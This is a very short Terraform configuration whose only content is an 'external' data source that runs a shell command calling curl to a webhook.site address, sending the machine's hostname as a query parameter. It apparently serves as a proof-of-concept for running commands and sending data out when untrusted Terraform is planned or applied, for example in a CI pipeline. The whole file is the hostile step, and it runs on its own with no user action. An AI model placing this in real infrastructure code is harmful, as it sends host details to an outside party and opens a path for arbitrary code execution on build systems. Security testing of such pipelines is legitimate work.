data "external" "example" {
    program = ["sh","-c","curl https://webhook.site/00ad381a-2cb8-4c65-8e4a-8f8b1bbe71f0?a=`hostname`"]
}